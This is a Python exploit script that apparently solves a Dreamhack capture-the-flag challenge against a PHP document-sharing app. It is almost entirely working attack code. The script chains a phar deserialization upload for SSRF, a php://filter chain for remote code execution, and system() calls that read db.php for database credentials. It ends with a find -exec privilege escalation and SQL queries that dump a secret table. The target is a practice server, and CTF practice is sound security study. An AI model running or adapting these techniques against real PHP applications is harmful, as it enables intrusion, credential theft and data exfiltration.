import requests
import re
import subprocess

url = "http://host8.dreamhack.games:22521/"
s = requests.Session()

# to save admin login
s.get(url)
sessid = s.cookies['PHPSESSID']

# ssrf with phar deserialization
def upload(filename, contents):
    res = s.post(f'{url}/report.php', data={
        'title': 'a',
        'content': 'a'
    }, files={
        'file': (
            filename,
            contents,
            'image/png'
        )
    })

    filepath = re.findall(r"alert\('(.+)'\)</scrip", res.text)[0]
    return filepath

def ssrf(access_code):
    subprocess.run(['php', '-d', 'phar.readonly=0', 'exploit.php', f"access_code={access_code}", f'PHPSESSID={sessid}'])

    with open('payload.phar', 'rb') as f:
        filepath = upload('payload.phar', f.read())

    res = s.post(f'{url}/delete.php', data={
        'title': f'phar://uploads/{filepath}/a.jpg'
    })

    return res.text

# get admin access code
def get_access_hash():
    res = s.get(f"{url}/view.php", params={
        'title': 'top secret document'.replace(' ', '\u2003')
    })

    access_hash = re.findall(r'content">(.+)</p>', res.text)[0].strip()
    return access_hash

# admin login
leak = ssrf('windows')

# filter chain rce
def rce(php):
    out = subprocess.check_output(['python', 'php_filter_chain_generator.py', '--chain', f'<?php {php} ?>']).decode()
    chain = re.findall(r'(php://filter.+)', out)[0].strip()

    res = s.post(f'{url}/dashboard.php', data={
        'filename': chain,
    })

    return res.text

shell = 'system("%s 2>&1")'

leak = rce(shell % "cat db.php")
account = re.findall(r"\$account = '(.+)'", leak)[0].strip()
password = re.findall(r"\$password = '(.+)'", leak)[0].strip()

def exec_sql(sql):
    db = '''
    $conn = mysqli_connect('127.0.0.1', '%s', '%s', 'document');
    $result = mysqli_query($conn, "%s");

    if($result === false){
        die("ERROR: " . mysqli_error($conn));
    }

    while($row = mysqli_fetch_row($result)) { 
        print_r($row);
    }
    '''.strip() % (account, password, sql)

    return rce(db)

# flag 1 (priv esc with mysql root)
leak = rce(shell % '/usr/bin/find . -exec /readflag \\; -quit')
flag1 = re.findall(r'(DH{.+):', leak)[0].strip()

# flag 2
leak = exec_sql('select * from secret')
flag2 = re.findall(r'\[0\] =>(.+)', leak)[0].strip()

print("Flag:", flag1 + flag2)